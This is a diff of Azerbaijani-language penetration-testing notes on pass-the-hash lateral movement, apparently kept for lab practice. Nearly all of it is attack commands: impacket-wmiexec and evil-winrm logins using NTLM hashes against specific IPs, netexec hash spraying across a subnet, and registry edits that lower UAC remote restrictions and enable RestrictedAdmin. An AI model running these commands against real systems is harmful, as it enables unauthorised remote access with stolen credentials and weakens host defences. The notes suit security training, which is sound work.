@@ -37,7 +37,7 @@ Domain ilə
 impacket-wmiexec 'DOMAIN/administrator@10.129.201.126' -hashes :30B3783CE2ABF1AF70F77D0660CF3453
 
 PowerShell əvəzinə CMD
-impacket-wmiexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453 --shell-type cmd
+impacket-wmiexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453 -shell-type cmd
 
 No output (sessiz)
 impacket-wmiexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453 -no-output
@@ -152,6 +152,8 @@ fi
 
 Əvvəlcə daxil ol
 evil-winrm -i 10.129.201.126 -u julio -H 64F12CDDAA88057E06A81B54E73B949B
+OR
+impacket-wmiexec 'administrator@10.129.204.23' -hashes :30B3783CE2ABF1AF70F77D0660CF3453 -shell-type powershell
 
 Shell-də
 reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
@@ -165,6 +167,10 @@ netexec smb 172.16.1.0/24 -u julio -H 64F12CDDAA88057E06A81B54E73B949B
 Fix et
 reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
 
+RestrictedAdmin 0 etmək
+reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f
+
 Test et
 netexec smb 10.129.201.126 -u julio -H 64F12CDDAA88057E06A81B54E73B949B
+
 
